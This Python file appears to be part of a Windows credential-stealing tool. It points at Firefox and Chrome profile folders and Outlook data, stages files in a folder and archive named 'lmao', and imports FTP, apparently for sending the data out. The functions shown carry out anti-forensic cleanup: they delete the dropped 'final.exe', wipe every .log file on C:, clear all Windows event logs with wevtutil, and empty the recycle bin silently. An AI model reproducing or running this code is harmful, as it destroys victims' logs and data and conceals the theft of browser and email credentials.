import subprocess
import os
import tarfile
from subprocess import call
from ftplib import FTP

##Main functions kill, snatch and grab, ftp_trans,
logged_user_dir = '%USERPROFILE%'
firefox_profile_loc = '%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles'
chrome_fix = "'Chrome User'"
chrome_profile_loc = '{}\AppData\Local\Google\Chrome'.format(logged_user_dir)
folder_loc = '{}\lmao'.format(logged_user_dir)
logged_user_os_fix = os.environ['USERPROFILE']
folder_loc_for_fix = '{}\lmao'.format(logged_user_os_fix)
outlook_loc = '{}\AppData\Local\Microsoft\Outlook'.format(logged_user_dir)
options_for_wev = '"wevtutil el | Foreach-Object {wevtutil cl "$_"}"'
triggers_for_trash = 'rd /s /q %systemdrive%\$Recycle.bin'
#vars have been added to final



def delete_script_final_and_step1():
    location_of_file = subprocess.run(['cmd.exe',['/c cd {} && dir final.exe /s /p'.format(logged_user_os_fix)]],stdout=subprocess.PIPE)
    location_of_file = location_of_file.stdout.decode('utf-8')
    location_of_file = str(location_of_file)
    location_of_file = location_of_file.split(' ')
    location_of_file = location_of_file[14]
    location_of_file = location_of_file.split()
    location_of_file =  location_of_file[0]
    os.system('@echo off && del /F /s {}\\final.exe >nul 2>&1'.format(location_of_file))

def log_cleaner():
    os.system('@echo off && rmdir {} /S /Q >nul 2>&1'.format(folder_loc))
    os.system('@echo off && del /F /s {}\\lmao.tar.gz >nul 2>&1'.format(logged_user_os_fix))
    os.system('@echo off && cd C:\ && del *.log /a /s /q /f >nul 2>&1')
    os.system('@echo off && powershell.exe -command {} >nul 2>&1'.format(options_for_wev))
    os.system('@echo off && {} >nul 2>&1'.format(triggers_for_trash))





